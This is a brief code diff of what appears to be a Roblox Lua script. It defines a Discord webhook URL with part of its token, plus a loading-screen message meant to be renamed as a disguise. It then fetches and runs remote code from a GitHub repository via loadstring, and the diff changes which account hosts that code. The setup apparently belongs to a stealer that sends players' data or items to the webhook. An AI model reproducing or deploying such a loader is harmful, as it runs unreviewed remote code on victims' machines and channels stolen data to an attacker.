@@ -4,4 +4,4 @@ _G.Webhook = "https://discord.com/api/webhooks/1096067493132509285/gRPv3VBOnUgFx
 
 _G.loadingScreenText = "Hi Cutie (with rizz) wait for a lil bit winks*"   -- replace text with ur script name 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BOYKIDLATLIGHTNING/mailsp/main/main", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()
